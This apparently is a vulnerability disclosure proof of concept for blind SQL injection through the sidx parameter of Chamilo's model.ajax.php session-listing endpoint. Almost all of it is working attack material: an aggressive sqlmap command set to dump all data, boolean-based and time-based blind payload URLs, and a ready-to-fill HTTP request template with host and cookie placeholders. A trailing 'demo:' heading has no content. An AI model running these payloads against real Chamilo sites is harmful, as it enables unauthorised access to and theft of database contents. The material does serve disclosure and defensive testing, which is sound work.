## Time based and boolean based SQLi via the sidx parameter

The following command was used,
```python3 sqlmap.py -r chamilo --level 5 --risk 3 --tamper between,charencode --random-agent --dbms mysql -a```

The command used in the demo is used to shorten the video.


```
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: http://cham/main/inc/ajax/model.ajax.php?a=get_sessions&list_type=simple&filters[groupOp]=AND&_search=false&nd=1745121263681&rows=20&page=1&sidx=(SELECT (CASE WHEN (2271=2271) THEN '' ELSE (SELECT 3569 UNION SELECT 1030) END))&sord=asc
```

```
Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: http://cham/main/inc/ajax/model.ajax.php?a=get_sessions&list_type=simple&filters[groupOp]=AND&_search=false&nd=1745121263681&rows=20&page=1&sidx=(CASE WHEN (8157=8157) THEN SLEEP(5) ELSE 8157 END)&sord=asc
```

The vulnerable request:
```
GET /main/inc/ajax/model.ajax.php?a=get_sessions&list_type=simple&filters%5BgroupOp%5D=AND&_search=false&nd=1745121263681&rows=20&page=1&sidx=*&sord=asc HTTP/1.1
Host: <REPLACE ME>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://<REPLACE ME>/main/session/session_list.php
Cookie: <REPLACE ME>
```

demo:
